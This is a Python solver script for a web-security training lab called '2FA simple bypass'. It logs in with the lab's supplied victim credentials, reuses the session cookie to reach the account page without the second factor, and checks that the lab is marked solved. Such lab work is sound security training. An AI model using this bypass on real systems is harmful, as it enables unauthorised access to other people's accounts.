from listgen import *
import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: 2FA simple bypass')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

data = {"username":"carlos","password":"montoya"}
# LOGIN WITH PROVIDED CREDENTIALS AND RETRIEVE COOKIE.
r = requests.post("https://" + lab.id + f".web-security-academy.net/login", data=data, allow_redirects=False)
carlos_session = r.cookies.get("session")
# SKIP 2FA VALIDATION REUSING THE COOKIE.
headers = {"Cookie":f"session={carlos_session}"}
r = requests.get("https://" + lab.id + f".web-security-academy.net/my-account", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")